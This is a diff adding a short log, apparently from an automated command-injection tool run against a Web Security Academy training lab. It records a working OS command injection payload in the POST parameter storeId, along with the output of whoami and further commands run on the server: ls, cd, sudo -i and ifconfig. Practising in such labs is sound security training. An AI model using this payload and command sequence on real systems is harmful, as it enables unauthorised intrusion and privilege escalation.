@@ -1,0 +1,27 @@
+
+=====================================
+| Started in 2025-10-25 at 07:24:16 |
+=====================================
+[info] Tested URL : https://0a4400b403d9f712809e8a31007e006f.web-security-academy.net/product/stock
+=====================================
+| Started in 2025-10-25 at 07:29:28 |
+=====================================
+[info] Tested URL : https://0a4400b403d9f712809e8a31007e006f.web-security-academy.net/product/stock
+[info] Type: Results-Based Os Command Injection
+[info] Technique: Classic Command Injection Technique
+[info] Parameter: (POST) storeId
+[info] Used payload: 1;echo YEXLUP$((49%2B73))$(echo YEXLUP)YEXLUP
+[info] User-supplied command 'whoami' execution output: peter-kr5t1f
+[info] Executed command: ls
+[info] Execution output: stockreport.sh
+[info] Executed command: cd ../
+[info] Execution output: 
+[info] Executed command: sudo -i
+[info] Execution output: 
+[info] Executed command: ifconfig
+[info] Execution output: 
+
+=====================================
+| Started in 2025-10-25 at 07:46:27 |
+=====================================
+[info] Tested URL : https://0a4400b403d9f712809e8a31007e006f.web-security-academy.net/product/stock
